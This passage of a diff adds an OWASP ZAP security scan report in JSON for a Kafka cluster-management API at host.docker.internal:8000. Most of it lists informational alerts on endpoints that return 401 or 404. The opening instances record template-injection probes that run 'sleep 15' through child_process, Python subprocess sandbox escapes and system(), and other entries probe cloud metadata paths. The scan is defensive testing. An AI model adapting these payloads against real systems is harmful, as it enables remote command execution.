+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"zj{{print \\\"1359\\\" \\\"8152\\\"}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7705",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"{system(\\\"sleep 15\\\")}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7546",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7603",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"{{\\\"\\\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\\\"__builtins__\\\").get(\\\"__import__\\\")(\\\"subprocess\\\").check_output(\\\"sleep 15\\\")}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7624",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"{{__import__(\\\"subprocess\\\").check_output(\\\"sleep 15\\\", shell=True)}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "7599",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services ()(\"{{range.constructor(\\\"return eval(\\\\\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\\\\\")\\\")()}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8477",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/services/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/services\/ ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "21",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/start",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/start",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8472",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/start/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/start\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "24",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/stop",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/stop",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8473",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/stop/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/stop\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "34",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics ()({\"name\":ZAP,\"partitions\":3,\"replication_factor\":1,\"config\":\"John Doe\"})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8458",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/topics/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/topics\/ ()({\"name\":ZAP,\"partitions\":3,\"replication_factor\":1,\"config\":\"John Doe\"})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "8475",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/validate",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/validate",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "41",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/validate?create_test_topic=true",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/validate (create_test_topic)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8499",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/validate/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/validate\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9",
+							"uri": "http://host.docker.internal:8000/api/hosts",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts ()({hostname,ip_address,ssh_port,username,auth_type,credential})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8500",
+							"uri": "http://host.docker.internal:8000/api/hosts/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/ ()({hostname,ip_address,ssh_port,username,auth_type,credential})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "14",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/prerequisites",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/prerequisites",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8490",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/prerequisites/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/prerequisites\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "13",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/test",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/test",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8493",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/test/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/test\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "88",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/deploy",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/deploy ()({port})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8495",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/deploy/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/deploy\/ ()({port})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "92",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/restart",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/restart",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8497",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/restart/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/restart\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "93",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/stop",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/stop",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8525",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/stop/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/stop\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "75",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/cluster_id/deploy-exporters",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/cluster_id\/deploy-exporters",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8516",
+							"uri": "http://host.docker.internal:8000/api/monitoring/clusters/cluster_id/deploy-exporters/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/clusters\/cluster_id\/deploy-exporters\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "73",
+							"uri": "http://host.docker.internal:8000/api/monitoring/install",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/install",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8519",
+							"uri": "http://host.docker.internal:8000/api/monitoring/install/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/monitoring\/install\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "84",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/cluster_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/cluster_id ()({scope})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8522",
+							"uri": "http://host.docker.internal:8000/api/rolling-restart/clusters/cluster_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/rolling-restart\/clusters\/cluster_id\/ ()({scope})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "99",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters/cluster_id/scan",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters\/cluster_id\/scan",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8518",
+							"uri": "http://host.docker.internal:8000/api/security-scan/clusters/cluster_id/scan/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/security-scan\/clusters\/cluster_id\/scan\/",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "96",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/pre-check",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/pre-check ()({target_version})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8517",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/pre-check/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/pre-check\/ ()({target_version})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "97",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/upgrade",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/upgrade ()({target_version})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8520",
+							"uri": "http://host.docker.internal:8000/api/upgrades/clusters/cluster_id/upgrade/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/upgrades\/clusters\/cluster_id\/upgrade\/ ()({target_version})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "31",
+							"uri": "http://host.docker.internal:8000/api/versions/kafka/upload",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/kafka\/upload ()(multipart:file)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8505",
+							"uri": "http://host.docker.internal:8000/api/versions/kafka/upload/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/versions\/kafka\/upload\/ ()(multipart:file)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "6320",
+							"uri": "http://host.docker.internal:8000/computeMetadata/v1/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/computeMetadata\/v1\/ ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6318",
+							"uri": "http://host.docker.internal:8000/latest/meta-data/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/latest\/meta-data\/ ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6416",
+							"uri": "http://host.docker.internal:8000/metadata/instance",
+							"nodeName": "http:\/\/host.docker.internal:8000\/metadata\/instance ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6421",
+							"uri": "http://host.docker.internal:8000/metadata/v1",
+							"nodeName": "http:\/\/host.docker.internal:8000\/metadata\/v1 ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6337",
+							"uri": "http://host.docker.internal:8000/opc/v1/instance/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/opc\/v1\/instance\/ ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6359",
+							"uri": "http://host.docker.internal:8000/opc/v2/instance/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/opc\/v2\/instance\/ ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6449",
+							"uri": "http://host.docker.internal:8000/openstack/latest/meta_data.json",
+							"nodeName": "http:\/\/host.docker.internal:8000\/openstack\/latest\/meta_data.json ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6",
+							"uri": "http://host.docker.internal:8000/api/auth/users/user_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users\/user_id ()({role,password,is_active})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8415",
+							"uri": "http://host.docker.internal:8000/api/auth/users/user_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users\/user_id\/ ()({role,password,is_active})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "80",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers/10/config",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers\/10\/config ()({config_key,config_value})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8418",
+							"uri": "http://host.docker.internal:8000/api/broker-config/clusters/cluster_id/brokers/10/config/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/broker-config\/clusters\/cluster_id\/brokers\/10\/config\/ ()({config_key,config_value})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "103",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id ()({topics_pattern,sync_consumer_offsets,sync_topic_configs,mm2_config_override})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8448",
+							"uri": "http://host.docker.internal:8000/api/cluster-linking/links/link_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/cluster-linking\/links\/link_id\/ ()({topics_pattern,sync_consumer_offsets,sync_topic_configs,mm2_config_override})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "47",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/pause",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/pause",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8426",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/pause/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/pause\/",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "48",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/resume",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/resume",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8454",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/connect/connectors/ZAP/resume/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/connect\/connectors\/ZAP\/resume\/",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "11",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id ()({hostname,ip_address,ssh_port,username,auth_type,credential})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8492",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id\/ ()({hostname,ip_address,ssh_port,username,auth_type,credential})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "91",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/config",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/config ()({config_yaml})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8498",
+							"uri": "http://host.docker.internal:8000/api/kafka-ui/clusters/cluster_id/config/",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/kafka-ui\/clusters\/cluster_id\/config\/ ()({config_yaml})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						}
+					],
+					"count": "495",
+					"systemic": false,
+					"solution": "",
+					"otherinfo": "",
+					"reference": "",
+					"cweid": "388",
+					"wascid": "20",
+					"sourceid": "12"
+				},
+				{
+					"pluginid": "10111",
+					"alertRef": "10111",
+					"alert": "Authentication Request Identified",
+					"name": "Authentication Request Identified",
+					"riskcode": "0",
+					"confidence": "1",
+					"riskdesc": "Informational (Low)",
+					"desc": "<p>The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to \"Auto-Detect\" then this rule will change the authentication to match the request identified.</p>",
+					"instances":[ 
+						{
+							"id": "2120",
+							"uri": "http://host.docker.internal:8000/api/clusters/cluster_id/security/users",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/clusters\/cluster_id\/security\/users ()({username,password,mechanism})",
+							"method": "POST",
+							"param": "username",
+							"attack": "",
+							"evidence": "password",
+							"otherinfo": "userParam=username\nuserValue=John Doe\npasswordParam=password"
+						}
+					],
+					"count": "1",
+					"systemic": false,
+					"solution": "<p>This is an informational alert rather than a vulnerability and so there is nothing to fix.</p>",
+					"otherinfo": "<p>userParam=username</p><p>userValue=John Doe</p><p>passwordParam=password</p>",
+					"reference": "<p>https://www.zaproxy.org/docs/desktop/addons/authentication-helper/auth-req-id/</p>",
+					"cweid": "-1",
+					"wascid": "-1",
+					"sourceid": "68"
+				},
+				{
+					"pluginid": "10049",
+					"alertRef": "10049-1",
+					"alert": "Non-Storable Content",
+					"name": "Non-Storable Content",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.</p>",
+					"instances":[ 
+						{
+							"id": "2088",
+							"uri": "http://host.docker.internal:8000/api/auth/me",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/me",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "2086",
+							"uri": "http://host.docker.internal:8000/api/auth/users",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "1",
+							"uri": "http://host.docker.internal:8000/api/auth/login",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/login ()({\"username\":\"John Doe\",\"password\":ZAP})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "2089",
+							"uri": "http://host.docker.internal:8000/api/auth/users",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/auth\/users ()({\"username\":\"John Doe\",\"password\":ZAP,\"role\":\"monitor\"})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "422",
+							"otherinfo": ""
+						},
+						{
+							"id": "2087",
+							"uri": "http://host.docker.internal:8000/api/hosts/host_id",
+							"nodeName": "http:\/\/host.docker.internal:8000\/api\/hosts\/host_id ()({hostname,ip_address,ssh_port,username,auth_type,credential})",
+							"method": "PUT",
+							"param": "",
+							"attack": "",
+							"evidence": "PUT ",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>The content may be marked as storable by ensuring that the following conditions are satisfied:</p><p>The request method must be understood by the cache and defined as being cacheable (\"GET\", \"HEAD\", and \"POST\" are currently defined as cacheable)</p><p>The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)</p><p>The \"no-store\" cache directive must not appear in the request or response header fields</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"private\" response directive must not appear in the response</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"Authorization\" header field must not appear in the request, unless the response explicitly allows it (using one of the \"must-revalidate\", \"public\", or \"s-maxage\" Cache-Control response directives)</p><p>In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:</p><p>It must contain an \"Expires\" header field</p><p>It must contain a \"max-age\" response directive</p><p>For \"shared\" caches such as \"proxy\" caches, it must contain a \"s-maxage\" response directive</p><p>It must contain a \"Cache Control Extension\" that allows it to be cached</p><p>It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc7234</p><p>https://datatracker.ietf.org/doc/html/rfc7231</p><p>https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</p>",
+					"cweid": "524",
+					"wascid": "13",
+					"sourceid": "7"
+				},
+				{
+					"pluginid": "10049",
+					"alertRef": "10049-3",
+					"alert": "Storable and Cacheable Content",
+					"name": "Storable and Cacheable Content",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users. If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where \"shared\" caching servers such as \"proxy\" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.</p>",
+					"instances":[ 
+						{
+							"id": "23",
+							"uri": "http://host.docker.internal:8000/openapi.json",
+							"nodeName": "http:\/\/host.docker.internal:8000\/openapi.json",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234."
+						}
+					],
+					"count": "1",
+					"systemic": true,
+					"solution": "<p>Validate that the response does not contain sensitive, personal or user-specific information. If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:</p><p>Cache-Control: no-cache, no-store, must-revalidate, private</p><p>Pragma: no-cache</p><p>Expires: 0</p><p>This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request.</p>",
+					"otherinfo": "<p>In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.</p>",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc7234</p><p>https://datatracker.ietf.org/doc/html/rfc7231</p><p>https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</p>",
+					"cweid": "524",
+					"wascid": "13",
+					"sourceid": "1"
+				}
+			]
+		}
+	],
+	"sequences":[
+	]
+
+}
